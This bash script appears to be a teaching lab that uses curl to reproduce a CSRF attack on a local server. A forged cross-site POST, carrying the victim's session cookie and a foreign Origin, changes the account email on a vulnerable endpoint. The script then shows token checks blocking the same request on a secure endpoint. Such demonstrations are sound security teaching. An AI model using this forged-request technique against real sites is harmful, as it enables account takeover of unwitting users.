#!/usr/bin/env bash
# run-attacks.sh — CSRF attack and defence against the running lab (port 3004).
#
# curl is used to reproduce EXACTLY what a browser sends when it submits the
# attacker's cross-site form: the victim's session cookie, a foreign Origin,
# and NO anti-CSRF token. If the server honours that, it is CSRF-vulnerable.
set -u
B="http://localhost:3004"
JAR=$(mktemp)
hr() { printf '\n============================================================\n%s\n============================================================\n' "$1"; }

hr "SETUP — victim logs in (session cookie saved to a jar)"
curl -s -c "$JAR" -X POST $B/login -H 'Content-Type: application/json' \
  -d '{"username":"alice","password":"password123"}'; echo
echo "current profile:"; curl -s -b "$JAR" $B/profile; echo

hr "ATTACK — forged cross-site request (victim cookie, foreign Origin, NO token)"
echo "POST /change-email-vulnerable  Origin: http://evil.example  email=attacker@evil.example"
curl -s -b "$JAR" -X POST $B/change-email-vulnerable \
  -H 'Origin: http://evil.example' \
  -d 'email=attacker@evil.example'; echo
echo "profile AFTER the attack:"; curl -s -b "$JAR" $B/profile; echo
echo ">>> the victim's email was changed by a request they never intended. CSRF succeeded."

hr "DEFENCE 1 — same forged request vs /change-email-secure (no token)"
curl -s -b "$JAR" -X POST $B/change-email-secure \
  -H 'Origin: http://evil.example' \
  -d 'email=attacker@evil.example'; echo

hr "DEFENCE 2 — attacker guesses/sends a wrong token"
curl -s -b "$JAR" -X POST $B/change-email-secure \
  -H 'Origin: http://evil.example' \
  -d 'email=attacker@evil.example&_csrf=wrongtoken'; echo

hr "LEGITIMATE — the real form carries the correct per-session token"
# The genuine user loads the form from the real site and submits WITH the token.
TOKEN=$(curl -s -b "$JAR" $B/form-secure | grep -oE 'value="[a-f0-9]{64}"' | grep -oE '[a-f0-9]{64}')
echo "token read from the real form: ${TOKEN:0:16}..."
curl -s -b "$JAR" -X POST $B/change-email-secure \
  -H 'Origin: http://localhost:3004' \
  -d "email=alice-new@example.com&_csrf=$TOKEN"; echo
echo "profile AFTER legitimate change:"; curl -s -b "$JAR" $B/profile; echo

rm -f "$JAR"
